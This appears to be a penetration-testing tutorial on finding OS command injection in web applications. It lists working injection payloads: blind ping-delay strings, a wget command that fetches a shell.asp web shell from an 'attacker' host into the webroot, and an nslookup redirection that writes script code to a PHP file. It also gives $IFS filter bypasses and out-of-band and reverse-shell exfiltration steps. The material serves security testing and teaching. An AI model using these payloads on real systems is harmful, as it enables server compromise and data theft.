# Finding OS Command Injection Flaws

Web applications may issue OS commands containing any item of user-supplied input, including URL parameters, POST data, and cookies. Identifying these vulnerable functions requires comprehensive testing across the entire application surface.

---

### Understanding Shell Metacharacters

Two types of metacharacters are commonly used to inject new commands:

- **Command chaining characters**: `;`, `|`, `&`, and newline (`\n`)
  - `&&`: Run second command only if the first succeeds 
  - `||`: Run second command only if the first fails 

- **Command substitution**: Backticks (`` ` ``)
  - Executes a command inline and substitutes its output into the command string

You should not assume metacharacter behavior based on the web server’s OS, as the application might call a different interpreter on a different host.

---

### Time-Based Detection (Blind Injection)

In many cases, command output is not returned to the response. To detect injection:

**Common universal test payload:**

```
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
```

**Submit the following payloads to all inputs (including cookies) and observe response delays:**

```
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```

> If the delay occurs, repeat with different ping durations (e.g., `5`, `10`, `15`) to ensure it’s not due to network anomalies.

---

### Extracting Command Output

1. **Try retrieving output via browser** using benign commands like:
   ```
   ls, dir
   ```

2. **If direct retrieval fails**, use one of the following:
   - **Out-of-band channels**: TFTP, Netcat, Telnet, SMTP (mail)
   - **Write to webroot**:
     ```
     dir > c:\inetpub\wwwroot\foo.txt
     ```

3. **Privilege escalation**:
   - Run `whoami` or try writing to protected locations to determine privileges.

---

### Restricted Injection Scenarios

In some cases, metacharacters are filtered, but input/output redirection (`<`, `>`) may still be usable.

**Example**:  
If `nslookup` is used with attacker-controlled input:

```
nslookup "[attacker code]" > /webroot/exploit.php
```

This error message gets written to the file:
```
** server can't find [attacker code]: NXDOMAIN
```

- The attacker places server-side script code inside the domain name, which is written into a web-accessible file and executed.

---

### Writing Arbitrary Files via CLI Options

Some commands allow writing files using flags:
- Example:
  ```
  wget http://attacker/ -O c:\inetpub\wwwroot\shell.asp
  ```

- If spaces are filtered, use Unix `$IFS` (Internal Field Separator) instead of space:
  ```
  curl$IFS-o$IFS/tmp/x
  ```

---

## HACK STEPS

1. **Target all input sources**: parameters, cookies, headers, etc.

2. **Submit time-based payloads** and monitor for response delays.

3. **If time delay occurs**, confirm with multiple values.

4. **Attempt to retrieve command output**:
   - Directly
   - Out-of-band (TFTP, reverse shell)
   - Write to webroot

5. **Use redirection characters** (`<`, `>`) where full command injection is blocked.

6. **Leverage command-line options** (e.g., `-O` for wget) to write payloads to disk.

7. **Use `$IFS`** as a substitute for space where needed.

---

## TIP

> Many platforms filter spaces. On UNIX-based systems, `$IFS` can be used as a workaround to inject whitespace in command parameters.

---

### Finding Dynamic Execution Vulnerabilities

1. **Look beyond direct commands**: Parameters may be passed to `eval`, `Execute`, etc.

2. **Try injecting known test payloads**:
   ```
   ;echo 111111
   echo 111111
   response.write 111111
   :response.write 111111
   ```

3. **Check if `111111` appears isolated** → potential code execution.

4. **Look for errors** indicating interpreted input.

5. **Test with `phpinfo()`** for PHP-based apps.

6. **Use time-based commands to verify execution**:
   ```
   system('ping 127.0.0.1')
   ```

